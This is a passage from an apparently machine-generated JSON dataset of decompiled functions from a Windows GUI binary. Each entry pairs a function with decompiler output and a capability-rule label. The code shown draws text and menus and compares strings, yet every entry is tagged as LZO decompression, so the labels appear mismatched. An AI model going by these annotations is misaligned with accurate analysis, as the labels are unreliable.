        "decompiled_code": "\nvoid __fastcall fcn.0042d0c0(uint32_t param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    int32_t *in_FS_OFFSET;\n    uint *puStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    char *var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = NULL;\n    var_8h = 0;\n    uStack52 = 0x42d37b;\n    puStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack56;\n    var_ch = param_2;\n    (**(*in_EAX + 0x94))();\n    if (((param_1 & 0x400) != 0) &&\n       ((var_4h == NULL || (((*(in_EAX + 0x68) != '\\0' && (*var_4h == '&')) && (var_4h[1] == '\\0')))))) {\n        fcn.0040506c();\n    }\n    uVar2 = fcn.00447efc();\n    fcn.00421b80();\n    if ((*(in_EAX + 0x1a2) != '\\0') && (*(in_EAX + 0x19d) == '\\0')) {\n        fcn.00404e38();\n        uVar2 = uVar2 & 0xffffffbf | *(*(in_EAX + 0x1a2) * 4 + 0x490e50);\n        if ((*(in_EAX + 0x19f) != '\\0') && (*(in_EAX + 0x1a2) - 2U < 2)) {\n            do {\n                var_1ch = *var_ch;\n                var_18h = var_ch[1];\n                var_14h = var_ch[2];\n                var_10h = var_ch[3];\n                iVar3 = fcn.00421ac0();\n                var_14h = var_14h - iVar3;\n                iVar3 = var_8h;\n                if (var_8h != 0) {\n                    iVar3 = *(var_8h + -4);\n                }\n                uVar4 = fcn.00405264(iVar3, &var_1ch, uVar2 | 0x400);\n                puStack56 = fcn.00421c8c(uVar4);\n                sub.user32.dll_DrawTextA();\n                iVar6 = var_10h - var_18h;\n                iVar3 = fcn.00444f5c();\n                if ((iVar6 <= iVar3) || (iVar3 = fcn.00420eb8(),  iVar6 <= iVar3)) break;\n                fcn.00409394();\n                fcn.0040cf54();\n                puStack56 = &var_4h;\n                fcn.004052c4();\n                fcn.004050b0();\n            } while (var_4h != NULL);\n        }\n        if (var_4h != NULL) {\n            fcn.00404e38();\n        }\n    }\n    cVar1 = (**(*in_EAX + 0x50))();\n    if (cVar1 == '\\0') {\n        sub.user32.dll_OffsetRect(var_ch, 1, 1);\n        fcn.00420c18();\n        pcVar7 = var_4h;\n        if (var_4h != NULL) {\n            pcVar7 = *(var_4h + -4);\n        }\n        puVar5 = var_ch;\n        uVar4 = fcn.00405264(pcVar7, var_ch, uVar2);\n        uVar4 = fcn.00421c8c(uVar4);\n        sub.user32.dll_DrawTextA(uVar4);\n        sub.user32.dll_OffsetRect(var_ch, 0xffffffff, 0xffffffff);\n        fcn.00420c18();\n        pcVar7 = var_4h;\n        if (var_4h != NULL) {\n            pcVar7 = *(var_4h + -4);\n        }\n        uVar4 = fcn.00405264(pcVar7, var_ch, uVar2);\n        uVar4 = fcn.00421c8c(uVar4);\n        sub.user32.dll_DrawTextA(uVar4);\n    }\n    else {\n        pcVar7 = var_4h;\n        if (var_4h != NULL) {\n            pcVar7 = *(var_4h + -4);\n        }\n        uVar4 = fcn.00405264(pcVar7, var_ch, uVar2);\n        puVar5 = fcn.00421c8c(uVar4);\n        sub.user32.dll_DrawTextA();\n    }\n    *in_FS_OFFSET = puVar5;\n    fcn.00404dc4(0x42d382);\n    return;\n}\n",
        "token_count": 1165
    },
    "0042ed80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ed80(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 6) == 0) {\n        (**(*in_EAX + 0xdc))();\n        return;\n    }\n    if (*(param_2 + 6) == 5) {\n        fcn.00404154();\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "004370c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00437119)\n// WARNING: Removing unreachable block (ram,0x00437126)\n// WARNING: Removing unreachable block (ram,0x00437133)\n// WARNING: Removing unreachable block (ram,0x0043713b)\n// WARNING: Removing unreachable block (ram,0x00437142)\n// WARNING: Removing unreachable block (ram,0x00437147)\n// WARNING: Removing unreachable block (ram,0x00437150)\n// WARNING: Removing unreachable block (ram,0x0043714c)\n// WARNING: Removing unreachable block (ram,0x0043715a)\n// WARNING: Removing unreachable block (ram,0x00437162)\n// WARNING: Removing unreachable block (ram,0x0043715e)\n// WARNING: Removing unreachable block (ram,0x0043716c)\n// WARNING: Removing unreachable block (ram,0x00437170)\n// WARNING: Removing unreachable block (ram,0x0043717e)\n\nvoid __cdecl fcn.004370c0(int32_t arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4371c4;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.00437078(arg_8h);\n    fcn.00437078(arg_8h);\n    (**(**(*(arg_8h + -8) + 0x84) + 0x38))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4371cb;\n    uStack24 = 0x4371c3;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 421
    },
    "00437364": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00437364(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    if ((1 < param_2) && (cVar1 = fcn.0040d238(),  cVar1 != '\\0')) {\n        fcn.0040d280();\n    }\n    fcn.004052c4(in_EAX + 0x74);\n    return;\n}\n",
        "token_count": 128
    },
    "00439b5c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00439b5c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    if (param_2 <= iVar2) {\n        uVar1 = fcn.00405264();\n        fcn.00405264(uVar1);\n        iVar2 = fcn.00408bfc();\n        if (iVar2 == 0) {\n            var_5h = 1;\n            fcn.00405304();\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 219
    },
    "00439be4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00439cab)\n\nvoid fcn.00439be4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int16_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = 0x439bfd;\n    fcn.00405254();\n    uStack40 = 0x439d07;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    do {\n        do {\n            cVar1 = fcn.00439b5c();\n        } while (cVar1 != '\\0');\n        cVar1 = fcn.00439b5c();\n    } while (((cVar1 != '\\0') || (cVar1 = fcn.00439b5c(),  cVar1 != '\\0')) || (cVar1 = fcn.00439b5c(),  cVar1 != '\\0'));\n    if (in_EAX != 0) {\n        iVar4 = 8;\n        do {\n            fcn.00439964();\n            iVar3 = in_EAX;\n            if (in_EAX != 0) {\n                iVar3 = *(in_EAX + -4);\n            }\n            uVar2 = fcn.00405264(0);\n            fcn.00405264(iVar3, uVar2);\n            uStack44 = 0x400;\n            iVar3 = sub.kernel32.dll_CompareStringA_1();\n        } while ((iVar3 != 2) && (iVar4 = iVar4 + 1,  iVar4 != 0x256));\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x439d0e;\n    uStack40 = 0x439cfe;\n    fcn.00404da0();\n    uStack40 = 0x439d06;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 491
    },
    "0043a908": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0043a954)\n// WARNING: Removing unreachable block (ram,0x0043a95e)\n\nvoid __cdecl fcn.0043a908(uint32_t arg_8h, uint arg_ch, uint *lprc)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint *in_FS_OFFSET;\n    uchar uVar6;\n    uint uStackY120;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack52 = 0x43aaf4;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    iVar2 = fcn.0043c984();\n    if ((iVar2 != 0) && (cVar1 = fcn.0043e204(),  cVar1 != '\\0')) {\n        arg_8h = arg_8h | 0x20002;\n    }\n    fcn.00404e38();\n    uVar6 = (arg_8h & 0x400) == 0;\n    if ((!uVar6) &&\n       ((uVar6 = var_4h == NULL,  uVar6 || ((uVar6 = *var_4h == '&',  uVar6 && (uVar6 = var_4h[1] == '\\0',  uVar6))))))\n    {\n        fcn.0040506c();\n    }\n    fcn.004051b0();\n    if (uVar6) {\n        if ((arg_8h & 0x400) == 0) {\n            var_1ch = *lprc;\n            uStack24 = lprc[2];\n            uStack20 = lprc[3];\n            var_18h = lprc[1] + 4;\n            uVar3 = fcn.00421c8c(&var_1ch, 6, 2);\n            sub.user32.dll_DrawEdge(uVar3);\n        }\n        goto code_r0x0043aade;\n    }\n    fcn.004215f0();\n    if (*(in_EAX + 0x3a) != '\\0') {\n        fcn.00420f98();\n        fcn.00420fa4();\n    }\n    if (*(in_EAX + 0x39) == '\\0') {\n        if (arg_ch == '\\0') {\n            sub.user32.dll_OffsetRect(lprc, 1, 1);\n            fcn.00420c18();\n            pcVar5 = var_4h;\n            if (var_4h != NULL) {\n                pcVar5 = *(var_4h + -4);\n            }\n            uVar3 = fcn.00405264(pcVar5, lprc, arg_8h);\n            uVar3 = fcn.00421c8c(uVar3);\n            sub.user32.dll_DrawTextA(uVar3);\n            sub.user32.dll_OffsetRect(lprc, 0xffffffff, 0xffffffff);\n        }\n        if (arg_ch != '\\0') {\n            iVar2 = fcn.0042074c();\n            iVar4 = fcn.0042074c();\n            if (iVar2 == iVar4) {\n                fcn.00420c18();\n                goto code_r0x0043aab5;\n            }\n        }\n        fcn.00420c18();\n    }\ncode_r0x0043aab5:\n    pcVar5 = var_4h;\n    if (var_4h != NULL) {\n        pcVar5 = *(var_4h + -4);\n    }\n    uVar3 = fcn.00405264(pcVar5, lprc, arg_8h);\n    uStackY120 = fcn.00421c8c(uVar3);\n    sub.user32.dll_DrawTextA();\ncode_r0x0043aade:\n    *in_FS_OFFSET = uStackY120;\n    fcn.00404da0(0x43aafb);\n    return;\n}\n",
        "token_count": 977
    },
    "0043ce30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ce30(int32_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint in_stack_ffffffb8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    char var_9h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    uStack44 = 0x43cf73;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    var_9h = '\\0';\n    var_10h = *in_EAX;\n    iVar2 = var_10h;\n    if (var_10h != 0) {\n        iVar2 = *(var_10h + -4);\n    }\n    if (0 < iVar2) {\n        iVar4 = 1;\n        do {\n            uVar3 = *(*in_EAX + -1 + iVar4);\n            if ((*(*0x492cec + (uVar3 >> 3)) >> (uVar3 & 7) & 1) != 0) {\n                var_9h = '\\x01';\n                break;\n            }\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    var_8h = param_1;\n    var_4h = param_2;\n    if (var_9h == '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (param_1 != 0) {\n            fcn.0040534c();\n            puVar1 = puStack40;\n        }\n    }\n    else {\n        var_10h = *in_EAX;\n        iVar2 = var_10h;\n        if (var_10h != 0) {\n            iVar2 = *(var_10h + -4);\n        }\n        uVar5 = iVar2 == 2;\n        puStack40 = &stack0xfffffffc;\n        fcn.004052c4(&var_14h);\n        fcn.004051b0();\n        if (uVar5) {\n            var_10h = *in_EAX;\n            fcn.004052c4(&var_18h);\n            in_stack_ffffffb8 = var_4h;\n            fcn.00405124(0x43cf88, 0x43cfac, var_4h, 0x43cfa0, 0x43cf94, var_18h);\n            puVar1 = puStack40;\n        }\n        else {\n            in_stack_ffffffb8 = 0x43cfac;\n            fcn.00405124(0x43cfac, var_4h, 0x43cfa0, 0x43cf94, *in_EAX);\n            puVar1 = puStack40;\n        }\n    }\n    puStack40 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffb8;\n    fcn.00404dc4(0x43cf7a);\n    return;\n}\n",
        "token_count": 771
    },
    "0043cfb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043cfb0(uint param_1, uchar param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar uVar7;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar *var_38h;\n    uint *var_34h;\n    uint uStack52;\n    int32_t *var_2ch;\n    uchar auStack44 [3];\n    uint var_25h;\n    int32_t var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 0x8;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != NULL);\n    var_20h = 0x43d438;\n    unique0x00007a00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0043cfb0::var_25h + 1;\n    _auStack44 = CONCAT13(param_2, auStack44) & 0xff00ffff;\n    puVar1 = &stack0xfffffffc;\n    var_18h = unaff_EDI;\n    if (var_25h == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            _auStack44 = 0x43cff1;\n            cVar2 = fcn.0043d5f0();\n            puVar1 = var_1ch;\n            if (cVar2 != '\\0') goto code_r0x0043cff9;\n        }\n        *in_FS_OFFSET = stack0xffffffd8;\n        var_1ch = 0x43d43f;\n        var_20h = 0x43d422;\n        fcn.00404dc4();\n        var_20h = 0x43d42f;\n        fcn.00404dc4();\n        var_20h = 0x43d437;\n        fcn.00404da0();\n        return;\n    }\ncode_r0x0043cff9:\n    var_1ch = puVar1;\n    _auStack44 = 0x43d007;\n    fcn.00404e38();\n    var_ch = NULL;\n    var_14h = NULL;\n    var_8h = NULL;\n    var_10h = 0;\n    var_2ch = 0x43d401;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    var_34h = 0x43d03a;\n    _auStack44 = &stack0xfffffffc;\n    var_ch = fcn.00403f28();\n    var_34h = 0x43d049;\n    var_14h = fcn.00403f28();\n    var_34h = 0x43d058;\n    var_2ch = fcn.00403f28();\n    var_34h = 0x43d067;\n    var_8h = fcn.00403f28();\n    var_34h = 0x43d071;\n    iVar3 = fcn.0043c3c4();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x43d089;\n            iVar3 = fcn.0043c3d4();\n            uVar7 = *(iVar3 + 0x3e) == '\\0';\n            if (!uVar7) {\n                var_34h = 0x43d09c;\n                fcn.0043c3d4();\n                var_34h = 0x43d0a9;\n                fcn.004051b0();\n                if (!uVar7) {\n                    var_34h = 0x43d0b8;\n                    iVar3 = fcn.0043c3d4();\n                    if (*(iVar3 + 0x30) != 0) {\n                        var_34h = 0x43d0cb;\n                        fcn.0043c3d4();\n                        var_34h = 0x43d0d6;\n                        fcn.0043f1a8();\n                        var_34h = 0x43d0e1;\n                        fcn.004088c4();\n                        if (var_1ch == NULL) {\n                            var_34h = 0x43d0f0;\n                            var_34h = fcn.0043c3d4();\n                            var_38h = 0x43d0fa;\n                            fcn.0043c3d4();\n                            var_38h = 0x43d107;\n                            (**(*var_2ch + 100))();\n                        }\n                        else {\n                            var_34h = 0x43d117;\n                            iVar3 = fcn.0040d2dc();\n                            if (iVar3 != 0) {\n                                var_38h = 0x43d124;\n                                var_34h = &stack0xfffffffc;\n                                cVar2 = fcn.0043cd7c(&stack0xfffffffc);\n                                if (cVar2 == '\\0') {\n                                    var_34h = 0x43d132;\n                                    iVar3 = fcn.0043c3d4();\n                                    var_34h = iVar3 + 0x30;\n                                    var_38h = 0x43d13f;\n                                    fcn.0043c3d4();\n                                    var_38h = 0x43d14a;\n                                    fcn.0043f0b8();\n                                    var_34h = 0x43d153;\n                                    fcn.00404df4();\n                                    var_34h = 0x43d15c;\n                                    var_34h = fcn.0043c3d4();\n                                    var_38h = 0x43d166;\n                                    fcn.0043c3d4();\n                                    var_38h = 0x43d173;\n                                    (**(*var_2ch + 100))();\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        } while (var_34h != 0x1);\n    }\n    var_34h = 0x43d188;\n    fcn.00404e38();\n    var_34h = 0x43d190;\n    iVar3 = (**(*var_2ch + 0x14))();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x43d1a8;\n            fcn.00404e38();\n            var_34h = 0x43d1b3;\n            (**(*var_14h + 8))();\n            var_34h = 0x43d1bb;\n            (**(*var_ch + 0x44))();\n            var_34h = 0x43d1c3;\n            iVar3 = (**(*var_14h + 0x14))();\n            iVar3 = iVar3 + -1;\n            if (-1 < iVar3) {\n                do {\n                    var_34h = 0x43d1dc;\n                    (**(*var_14h + 0xc))();\n                    iVar6 = 1;\n                    while( true ) {\n                        var_34h = 0x43d280;\n                        iVar5 = fcn.00405060();\n                        if (iVar5 < iVar6) break;\n                        uVar4 = *(var_20h + -1 + iVar6);\n                        if ((*(*0x492cec + (uVar4 >> 3)) >> (uVar4 & 7) & 1) == 0) {\n                            var_34h = &fcn.0043cfb0::var_40h;\n                            var_38h = 0x43d212;\n                            fcn.004052c4();\n                            var_38h = 0x43d21d;\n                            fcn.004088c4();\n                            var_3ch = 0x43d226;\n                            var_38h = &stack0xfffffffc;\n                            cVar2 = fcn.0043cd7c(&stack0xfffffffc);\n                            if (cVar2 != '\\0') {\n                                if (*(*0x492d08 + 0xc) == '\\0') {\n                                    var_38h = 0x43d254;\n                                    fcn.0040534c();\n                                }\n                                else {\n                                    var_38h = 0x43d243;\n                                    fcn.0043ce30();\n                                }\n                                var_38h = 0x43d25e;\n                                (**(*var_14h + 0x18))();\n                                var_38h = 0x43d26b;\n                                (**(*var_ch + 0x3c))();\n                                var_38h = 0x43d275;\n                                (**(*var_14h + 0x48))();\n                                break;\n                            }\n                        }\n                        else {\n                            iVar6 = iVar6 + 1;\n                        }\n                        iVar6 = iVar6 + 1;\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_34h = 0x43d29a;\n            iVar3 = (**(*var_ch + 0x14))();\n            if (var_10h < iVar3) {\n                var_38h = 0x43d2a5;\n                var_34h = &stack0xfffffffc;\n                fcn.0043cdac(&stack0xfffffffc);\n            }\n            var_34h = 0x43d2ae;\n            iVar3 = (**(*var_14h + 0x14))();\n            if (iVar3 < 1) break;\n            var_34h = 0x43d2ba;\n            iVar3 = (**(*var_14h + 0x14))();\n            if (-1 < iVar3 + -1) {\n                do {\n                    var_34h = 0x43d2ce;\n                    (**(*var_14h + 0x18))();\n                    var_34h = 0x43d2d8;\n                    (**(*var_2ch + 0x5c))();\n                    var_34h = 0x43d2e2;\n                    (**(*var_2ch + 0x14))();\n                    var_34h = 0x43d2ef;\n                    (**(*var_2ch + 0x70))();\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n        } while (var_34h != 0x1);\n    }\n    if (var_10h == 0) {\n        var_38h = 0x43d308;\n        var_34h = &stack0xfffffffc;\n        fcn.0043cdac(&stack0xfffffffc);\n    }\n    var_34h = 0x43d311;\n    iVar3 = (**(*var_8h + 0x14))();\n    auStack44 = CONCAT12(0 < iVar3, auStack44._0_2_);\n    _auStack44 = _auStack44 & 0xff000000 | auStack44;\n    var_34h = 0x43d31f;\n    iVar3 = (**(*var_8h + 0x14))();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x43d33b;\n            (**(*var_8h + 0xc))();\n            if (*(*0x492d08 + 0xc) != '\\0') {\n                var_34h = 0x43d353;\n                iVar3 = fcn.0040d2dc();\n                if ((iVar3 == 0) && (var_18h != 0)) {\n                    var_34h = 0x43d36a;\n                    iVar3 = fcn.0040d2dc();\n                    if (iVar3 == 0) {\n                        var_34h = &fcn.0043cfb0::var_44h;\n                        var_38h = 0x43d38d;\n                        fcn.004052c4();\n                        var_38h = 0x43d39a;\n                        fcn.0043ce30();\n                        var_38h = 0x43d3b4;\n                        fcn.00405304();\n                    }\n                }\n            }\n            var_34h = 0x43d3be;\n            (**(*var_8h + 0x18))();\n            var_34h = 0x43d3c9;\n            fcn.00404df4();\n            var_34h = var_34h + -1;\n        } while (var_34h != NULL);\n    }\n    *in_FS_OFFSET = uStack52;\n    _auStack44 = 0x43d408;\n    var_2ch = 0x43d3e8;\n    fcn.00403f58();\n    var_2ch = 0x43d3f0;\n    fcn.00403f58();\n    var_2ch = 0x43d3f8;\n    fcn.00403f58();\n    var_2ch = 0x43d400;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 3146
    },
    "0043e278": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x0043e30e)\n// WARNING: Removing unreachable block (ram,0x0043e326)\n\nvoid __cdecl fcn.0043e278(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint16_t in_DX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack44 = &var_2h + 2;\n    uStack48 = 0x43e3a3;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    if ((in_DX & 0x10) == 0) {\n        iVar1 = fcn.0043d848();\n        if ((iVar1 != 0) && (iVar2 = fcn.0043c3c4(),  in_ECX < iVar2)) {\n            iVar1 = fcn.0043c3d4();\n        }\n    }\n    else {\n        puStack44 = &var_2h + 2;\n        sub.user32.dll_GetSubMenu();\n        iVar1 = fcn.0043d848();\n        uStack60 = in_EAX;\n    }\n    if ((iVar1 != 0) && (*(iVar1 + 0x30) != 0)) {\n        fcn.00404f88();\n        fcn.00404f88();\n        fcn.00404f88(0);\n        uVar3 = fcn.00405264();\n        fcn.00404f88(0, uVar3);\n        uVar3 = fcn.00405264();\n        iVar1 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar3);\n        if (iVar1 == 2) {\n            fcn.0043f1a8();\n        }\n    }\n    *in_FS_OFFSET = uStack60;\n    uStack52 = 0x43e3aa;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 540
    },
    "0043f0b8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f0b8(uint param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    fcn.00404df4();\n    for (iVar3 = 1; iVar2 = fcn.00405060(),  iVar3 <= iVar2; iVar3 = iVar3 + 1) {\n        uVar1 = *(*param_2 + -1 + iVar3);\n        if ((*(*0x492cec + (uVar1 >> 3)) >> (uVar1 & 7) & 1) == 0) {\n            if (*(*param_2 + -1 + iVar3) == '&') {\n                if (*(*0x492d08 + 0xc) == '\\0') {\n                    bVar4 = false;\n                }\n                else {\n                    if (iVar3 < 2) {\n                        bVar4 = false;\n                    }\n                    else {\n                        iVar2 = *param_2;\n                        if (iVar2 != 0) {\n                            iVar2 = *(iVar2 + -4);\n                        }\n                        bVar4 = 1 < iVar2 - iVar3;\n                    }\n                    if (bVar4) {\n                        bVar4 = *(*param_2 + -2 + iVar3) == '(';\n                    }\n                    else {\n                        bVar4 = false;\n                    }\n                    if (bVar4) {\n                        bVar4 = *(*param_2 + 1 + iVar3) == ')';\n                    }\n                    else {\n                        bVar4 = false;\n                    }\n                }\n                if (bVar4) {\n                    fcn.00405304();\n                }\n                else {\n                    fcn.00405304();\n                }\n            }\n        }\n        else {\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 410
    },
    "0043f1a8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0043f1a8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    fcn.00404da0();\n    iVar3 = 1;\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    if (0 < iVar1) {\n        do {\n            uVar2 = *(in_EAX + -1 + iVar3);\n            if ((*(*0x492cec + (uVar2 >> 3)) >> (uVar2 & 7) & 1) == 0) {\n                if (((*(in_EAX + -1 + iVar3) == '&') && (0 < iVar1 - iVar3)) &&\n                   (iVar3 = iVar3 + 1,  *(in_EAX + -1 + iVar3) != '&')) {\n                    fcn.00404f88();\n                }\n            }\n            else {\n                iVar3 = iVar3 + 1;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 <= iVar1);\n    }\n    return;\n}\n",
        "token_count": 266
    },
    "0043f210": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0043f25a)\n// WARNING: Removing unreachable block (ram,0x0043f266)\n\nvoid fcn.0043f210(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x43f2b3;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    fcn.0043f0b8();\n    fcn.0043f0b8();\n    uVar1 = fcn.00405264(0);\n    uVar1 = fcn.00405264(0, uVar1);\n    uVar2 = 0x400;\n    sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00404dc4(0x43f2ba);\n    return;\n}\n",
        "token_count": 273
    },
    "0044b7d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
